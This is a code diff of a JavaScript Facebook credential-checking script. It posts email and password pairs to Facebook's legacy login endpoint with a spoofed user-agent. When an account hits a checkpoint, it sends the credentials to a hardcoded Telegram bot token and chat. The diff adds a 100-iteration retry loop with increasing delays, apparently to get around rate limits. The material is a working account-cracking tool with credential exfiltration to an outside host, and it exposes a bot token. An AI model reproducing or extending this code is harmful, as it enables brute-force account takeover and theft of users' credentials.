@@ -17,6 +17,9 @@ const ID = '1758975211';
 const tok = '7160121436:AAEb846gUsrXPjPTw5t2ERT1zNxqkZzd9nA';
 const user = '1234567890';
 
+// دالة تأخير
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
 async function code_whisper(email, password) {
     const url = 'https://api.facebook.com/method/auth.login';
     const headers = {
@@ -47,6 +50,7 @@ async function main() {
         if (email === '' || password === '') {
             process.exit();
         }
+
         const url = 'https://api.facebook.com/method/auth.login';
         const headers = {
             'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
@@ -59,14 +63,24 @@ async function main() {
             'locale': "en_DZ",
             'format': 'JSON'
         };
-        const req = await axios.post(url, data, { headers: headers });
-        if ('access_token' in req.data) {
-            await code_whisper(email, password);
-        } else if (req.data.error_msg.includes('(405)')) {
-            console.log(colors.yellow(`CheckPoint ${email}:${password}`));
-            await axios.post(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${ID}&text=.💀.Owner @oussamabakrine💀.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.\n.✉. E-mail ==> ${email} \n.🚫. PassWord ==> ${password} \n.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈 هق مشا.`);
-        } else {
-            console.log(colors.red(`num => ${email} | pass => ${password}`));
+
+        for (let i = 0; i < 100; i++) {
+            // تأخير لمدة ثانية
+            await sleep(i * 1000); // التأخير يزداد مع كل طلب
+            
+            const request = async () => {
+                const req = await axios.post(url, data, { headers: headers });
+                if ('access_token' in req.data) {
+                    await code_whisper(email, password);
+                } else if (req.data.error_msg.includes('(405)')) {
+                    console.log(colors.yellow(`CheckPoint ${email}:${password}`));
+                    await axios.post(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${ID}&text=.💀.Owner @oussamabakrine💀.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.\n.✉. E-mail ==> ${email} \n.🚫. PassWord ==> ${password} \n.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈 هق مشا.`);
+                } else {
+                   // console.log(colors.red(`num => ${email} | pass => ${password}`));
+                }
+            };
+
+            await request();
         }
     }
 }
